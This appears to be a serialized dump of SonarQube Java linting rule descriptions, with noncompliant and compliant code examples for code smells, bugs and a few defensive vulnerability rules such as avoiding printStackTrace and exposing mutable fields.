<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException
} catch (Exception e) { // Noncompliant
  // log exception ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {
  // log exception ...
}
</pre>
<p>or if runtime exceptions should not be caught:</p>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {
  // log exception ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
</ul>Z
CODE_SMELL
È

java:S1132⁄
javaS1132MStrings literals should be placed on the left side when checking for equality"MINOR*java:‚<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>
<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myString = null;

System.out.println("Equal? " + myString.equals("foo"));                        // Noncompliant; will raise a NPE
System.out.println("Equal? " + (myString != null &amp;&amp; myString.equals("foo")));  // Noncompliant; null check could be removed
</pre>
<h2>Compliant Solution</h2>
<pre>
System.out.println("Equal?" + "foo".equals(myString));                         // properly deals with the null case
</pre>Z
CODE_SMELL
ä

java:S1130˚
javaS1130/"throws" declarations should not be superfluous"MINOR*java:°<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>
<ul>
  <li> listed multiple times </li>
  <li> a subclass of another listed exception </li>
  <li> a <code>RuntimeException</code>, or one of its descendants </li>
  <li> completely unnecessary because the declared exception type cannot actually be thrown </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() throws MyException, MyException {}  // Noncompliant; should be listed once
void bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable
void baz() throws RuntimeException {}  // Noncompliant; RuntimeException can always be thrown
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() throws MyException {}
void bar() throws Throwable {}
void baz() {}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>
<ul>
  <li> in overriding and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement . </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper
  javadoc. </li>
</ul>
<pre>
class A extends B {
  @Override
  void doSomething() throws IOException {
    compute(a);
  }

  public void foo() throws IOException {}

  protected void bar() throws IOException {
    throw new UnsupportedOperationException("This method should be implemented in subclasses");
  }

  Object foobar(String s) throws IOException {
    return null;
  }

  /**
   * @throws IOException Overriding classes may throw this exception if they print values into a file
   */
  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc
    System.out.println("foo");
  }
}
</pre>Z
CODE_SMELL
√

java:S3437¥
javaS3437,Value-based objects should not be serialized"MINOR*java:›<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization, identity hashing, serialization...
</blockquote>
<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = new Foo(0);
</pre>
<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = arr[0];
</pre>
<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>
<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true
value types are introduced in the language.</p>
<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable
value-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the
date classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass implements Serializable {
  private HijrahDate date;  // Noncompliant; mark this transient
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass implements Serializable {
  private transient HijrahDate date;
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>Z
CODE_SMELL
å


java:S1148˝	
javaS11483Throwable.printStackTrace(...) should not be called"MINOR*java:ú	<p><code>Throwable.printStackTrace(...)</code> prints a <code>Throwable</code> and its stack trace to some stream. By default that stream
<code>System.Err</code>, which could inadvertently expose sensitive information.</p>
<p>Loggers should be used instead to print <code>Throwable</code>s, as they have many advantages:</p>
<ul>
  <li> Users are able to easily retrieve the logs. </li>
  <li> The format of log messages is uniform and allow users to browse the logs easily. </li>
</ul>
<p>This rule raises an issue when <code>printStackTrace</code> is used without arguments, i.e. when the stack trace is printed to the default
stream.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace();        // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log("context", e);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
›

java:S1264Œ
javaS12645A "while" loop should be used instead of a "for" loop"MINOR*java:Ó<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>Z
CODE_SMELL
ø

java:S2203∞
javaS2203>"collect" should be used with "Streams" instead of "list::add""MINOR*java:«<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the
better choice because it's automatically thread-safe and parallellizable. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; bookNames = new ArrayList&lt;&gt;();
books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .forEach(bookNames::add);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .collect(Collectors.toList());
</pre>Z
CODE_SMELL
Ä


java:S2325Ò	
javaS2325D"private" methods that don't access instance data should be "static""MINOR*java:Ç	<p><code>private</code> methods that don't access instance data can be <code>static</code> to prevent any misunderstanding about the contract of the
method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private String getMagicWord() { // Noncompliant
    return magicWord;
  }

  private void setMagicWord(String value) { // Noncompliant
    magicWord = value;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private static String getMagicWord() {
    return magicWord;
  }

  private static void setMagicWord(String value) {
    magicWord = value;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>
<ul>
  <li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>
  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>
  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>
</ul>Z
CODE_SMELL
¢

java:S1596ì
javaS1596I"Collections.EMPTY_LIST", "EMPTY_MAP", and "EMPTY_SET" should not be used"MINOR*java:ü<p>Since the introduction of generics in Java 5, the use of generic types such as <code>List&lt;String&gt;</code> is recommended over the use of raw
ones such as <code>List</code>. Assigning a raw type to a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code>
fields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; collection1 = Collections.EMPTY_LIST;  // Noncompliant
Map&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;  // Noncompliant
Set&lt;String&gt; collection3 = Collections.EMPTY_SET;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; collection1 = Collections.emptyList();
Map&lt;String, String&gt; collection2 = Collections.emptyMap();
Set&lt;String&gt; collection3 = Collections.emptySet();
</pre>Z
CODE_SMELL
Ñ

java:S2200ı
javaS2200="compareTo" results should not be checked for specific values"MINOR*java:î<p>While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific
value other than 0 could result in false negatives.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myClass.compareTo(arg) == -1) {  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myClass.compareTo(arg) &lt; 0) {
  // ...
}
</pre>ZBUG
∞

java:S3419°
javaS3419+Group ids should follow a naming convention"MINOR*java:À<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom's <code>groupId</code> does not match
the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>(com|org)(\.[a-z][a-z-0-9]*)+</code></p>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;com.myco&lt;/groupId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>Z
CODE_SMELL
ô

java:S3658ä
javaS3658"Unit tests should throw exceptions"MINOR*java:Ω<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a
<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>
<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testMethod() {
  try {
            // Some code
  } catch (MyException e) {
    Assert.fail(e.getMessage());  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testMethod() throws MyException {
    // Some code
}
</pre>Z
CODE_SMELL
¢

java:S3416ì
javaS34163Loggers should be named for their enclosing classes"MINOR*java:µ<p>It is convention to name each class's logger for the class itself. Doing so allows you to set up clear, communicative logger configuration. Naming
loggers by some other convention confuses configuration, and using the same class name for multiple class loggers prevents the granular configuration
of each class' logger. Some libraries, such as SLF4J warn about this, but not all do.</p>
<p>This rule raises an issue when a logger is not named for its enclosing class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class);  // Noncompliant; multiple classes using same logger
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);
}
</pre>Z
CODE_SMELL
¶

java:S1116ó
javaS1116"Empty statements should be removed"MINOR*java: 
<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse() {
  System.out.println("Hello, world!");;                     // Noncompliant - double ;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {}

void doSomethingElse() {
  System.out.println("Hello, world!");
  ...
  for (int i = 0; i &lt; 3; i++) ; // compliant if unique statement of a loop
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL


java:S2698·
javaS2698(JUnit assertions should include messages"MINOR*java:é<p>Adding messages to JUnit assertions is an investment in your future productivity. Spend a few seconds writing them now, and you'll save a lot of
time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the tests and the
assertion messages work as a sort of documentation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertEquals(4, list.size());  // Noncompliant

try {
  fail();  // Noncompliant
} catch (Exception e) {
  assertThat(list.get(0)).isEqualTo("pear");  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
assertEquals("There should have been 4 Fruits in the list", 4, list.size());

try {
  fail("And exception is expected here");
} catch (Exception e) {
  assertThat(list.get(0)).as("check first element").overridingErrorMessage("The first element should be a pear, not a %s", list.get(0)).isEqualTo("pear");
}
</pre>Z
CODE_SMELL
≠

java:S1126û
javaS1126TReturn of boolean expressions should not be wrapped into an "if-then-else" statement"MINOR*java:ü<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single
invocation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean foo(Object param) {
  if (expression) { // Noncompliant
    bar(param, true, "qix");
  } else {
    bar(param, false, "qix");
  }

  if (expression) {  // Noncompliant
    return true;
  } else {
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean foo(Object param) {
  bar(param, expression, "qix");

  return expression;
}
</pre>Z
CODE_SMELL
√

java:S1125¥
javaS1125(Boolean literals should not be redundant"MINOR*java:·<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;
</pre>Z
CODE_SMELL
´

java:S1488ú
javaS1488NLocal variables should not be declared and then immediately returned or thrown"MINOR*java:£<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public long computeDurationInMilliseconds() {
  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}

public void doSomething() {
  RuntimeException myException = new RuntimeException();
  throw myException;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public long computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}

public void doSomething() {
  throw new RuntimeException();
}
</pre>Z
CODE_SMELL
ô

java:S1124ä
javaS11241Modifiers should be declared in the correct order"MINOR*java:Æ<p>The Java Language Specification recommends listing modifiers in the following order:</p>
<p>1. Annotations</p>
<p>2. public</p>
<p>3. protected</p>
<p>4. private</p>
<p>5. abstract</p>
<p>6. static</p>
<p>7. final</p>
<p>8. transient</p>
<p>9. volatile</p>
<p>10. synchronized</p>
<p>11. native</p>
<p>12. strictfp</p>
<p>Not following this convention has no technical impact, but will reduce the code's readability because most developers are used to the standard
order.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static public void main(String[] args) {   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {   // Compliant
}
</pre>Z
CODE_SMELL
ﬂ

java:S2333–
javaS2333&Redundant modifiers should not be used"MINOR*java:ˇ<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically
<code>public static final</code>. There is no need to explicitly declare them so.</p>
<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>
<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, and <code>private</code> is redundant on the
constructor of an <code>Enum</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Vehicle {

  public void go(int speed, Direction direction);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Vehicle {

  void go(int speed, Direction direction);
</pre>Z
CODE_SMELL
å

java:S3423˝
javaS3423/pom elements should be in the recommended order"MINOR*java:£<p>The POM Code Convention is the Maven project's internal recommendation for POM element ordering. It calls for listing modifiers in the following
order:</p>
<ol>
  <li> &lt;modelVersion/&gt; </li>
  <li> &lt;parent/&gt; </li>
  <li> &lt;groupId/&gt; </li>
  <li> &lt;artifactId/&gt; </li>
  <li> &lt;version/&gt; </li>
  <li> &lt;packaging/&gt; </li>
  <li> &lt;name/&gt; </li>
  <li> &lt;description/&gt; </li>
  <li> &lt;url/&gt; </li>
  <li> &lt;inceptionYear/&gt; </li>
  <li> &lt;organization/&gt; </li>
  <li> &lt;licenses/&gt; </li>
  <li> &lt;developers/&gt; </li>
  <li> &lt;contributors/&gt; </li>
  <li> &lt;mailingLists/&gt; </li>
  <li> &lt;prerequisites/&gt; </li>
  <li> &lt;modules/&gt; </li>
  <li> &lt;scm/&gt; </li>
  <li> &lt;issueManagement/&gt; </li>
  <li> &lt;ciManagement/&gt; </li>
  <li> &lt;distributionManagement/&gt; </li>
  <li> &lt;properties/&gt; </li>
  <li> &lt;dependencyManagement/&gt; </li>
  <li> &lt;dependencies/&gt; </li>
  <li> &lt;repositories/&gt; </li>
  <li> &lt;pluginRepositories/&gt; </li>
  <li> &lt;build/&gt; </li>
  <li> &lt;reporting/&gt; </li>
  <li> &lt;profiles/&gt; </li>
</ol>
<p>Not following this convention has no technical impact, but will reduce the pom's readability because most developers are used to the standard
order.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention">POM Code Convention</a> </li>
</ul>Z
CODE_SMELL
∏

java:S3420©
javaS3420.Artifact ids should follow a naming convention"MINOR*java:–<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom's <code>artifactId</code> does not match the
provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;my-project&lt;/artifactId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>Z
CODE_SMELL
–

java:S3421¡
javaS34211Deprecated "${pom}" properties should not be used"MINOR*java:Â<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect,
deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated
features should be added, and all existing uses should be gradually removed.</p>
<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;
</pre>
<p>or</p>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;
</pre>Z
CODE_SMELL
ò

java:S1120â
javaS1120+Source code should be indented consistently"MINOR*java:≥<p>Proper indentation is a simple and effective way to improve the code's readability. Consistent indentation among the developers within a team also
reduces the differences that are committed to source control systems, making code reviews easier. </p>
<p>This rule raises an issue when indentation does not match the configured value. Only the first line of a badly indented section is reported.</p>
<h2>Noncompliant Code Example</h2>
<p>With an indent size of 2:</p>
<pre>
class Foo {
  public int a;
   public int b;   // Noncompliant, expected to start at column 4

...

  public void doSomething() {
    if(something) {
          doSomethingElse();  // Noncompliant, expected to start at column 6
  }   // Noncompliant, expected to start at column 4
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo {
  public int a;
  public int b;

...

  public void doSomething() {
    if(something) {
        doSomethingElse();
    }
  }
}
</pre>Z
CODE_SMELL
˙

java:S1128Î
javaS1128%Unnecessary imports should be removed"MINOR*java:õ<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>
<p>Unused and useless imports should not occur if that is the case. </p>
<p>Leaving them in reduces the code's readability, since their presence can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.company;

import java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported
import my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported
import java.io.File;            // Noncompliant; File is not used

import my.company2.SomeType;
import my.company2.SomeType;    // Noncompliant; 'SomeType' is already imported

class ExampleClass {

  public String someString;
  public SomeType something;

}
</pre>
<h2>Exceptions</h2>
<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>Z
CODE_SMELL
™

java:S1481õ
javaS1481(Unused local variables should be removed"MINOR*java:»<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int numberOfMinutes(int hours) {
  int seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int numberOfMinutes(int hours) {
  return hours * 60;
}
</pre>Z
CODE_SMELL
ó

java:S2148à
javaS21489Underscores should be used to make large numbers readable"MINOR*java:§
<p>Beginning with Java 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this
manner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>octal</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>Z
CODE_SMELL
Õ

java:S3599æ
javaS3599.Double Brace Initialization should not be used"MINOR*java:Ï<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to
memory leaks if the anonymous inner class is returned and held by other objects. Even when there's no leak, DBI is so obscure that it's bound to
confuse most maintainers. </p>
<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Map source = new HashMap(){{ // Noncompliant
    put("firstName", "John");
    put("lastName", "Smith");
}};
</pre>
<h2>Compliant Solution</h2>
<pre>
Map source = new HashMap();
// ...
source.put("firstName", "John");
source.put("lastName", "Smith");
// ...
</pre>ZBUG
Û

java:S2147‰
javaS2147Catches should be combined"MINOR*java:ü<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they
should be combined for better readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (IOException e) {
  doCleanup();
  logger.log(e);
}
catch (SQLException e) {  // Noncompliant
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {  // Compliant; block contents are different
  doCleanup();
  throw e;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (IOException|SQLException e) {
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {
  doCleanup();
  throw e;
}
</pre>Z
CODE_SMELL
Õ

java:S2386æ
javaS2386,Mutable fields should not be "public static""MINOR*java:‰<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.
Such variables should be moved into classes and their visibility lowered. </p>
<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,
should be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>
<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on
the mutability of the internal state of the array (i.e. it doesn't accomplish the goal).</p>
<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyInterface {
  public static String [] strings; // Noncompliant
}

public class A {
  public static String [] strings1 = {"first","second"};  // Noncompliant
  public static String [] strings2 = {"first","second"};  // Noncompliant
  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/rwBc">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JQLEAw">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed
  </li>
</ul>ZVULNERABILITY


java:S2384·
javaS23849Mutable members should not be stored or returned directly"MINOR*java:˙<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Mutable class members should never be
returned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>
<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,
<code>Collections.unmodifiableList</code>, ...) or make a copy of the mutable object, and store or return the copy instead.</p>
<p>This rule checks that arrays, collections and Dates are not stored or returned directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings; // Noncompliant
  }

  public void setStrings(String [] strings) {
    this.strings = strings;  // Noncompliant
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"yellow", "second"};
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings.clone();
  }

  public void setStrings(String [] strings) {
    this.strings = strings.clone();
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"first", "second"};
  }
}

</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/374">MITRE, CWE-374</a> - Passing Mutable Objects to an Untrusted Method </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/375">MITRE, CWE-375</a> - Returning a Mutable Object to an Untrusted Caller </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zQCuAQ">CERT, OBJ05-J.</a> - Do not return references to private mutable class members
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QIEVAQ">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal
  components </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JQLEAw">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed
  </li>
</ul>ZVULNERABILITY
»

java:S4201π
javaS42010Null checks should not be used with "instanceof""MINOR*java:ﬁ<p>There's no need to null test in conjunction with an <code>instanceof</code> test. <code>null</code> is not an <code>instanceof</code> anything, so
a null check is redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != null &amp;&amp; x instanceof MyClass) { ... }  // Noncompliant

if (x == null || ! x instanceof MyClass) { ... } // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x instanceof MyClass) { ... }

if (! x instanceof MyClass) { ... }
</pre>Z
CODE_SMELL
ì

java:S5411Ñ
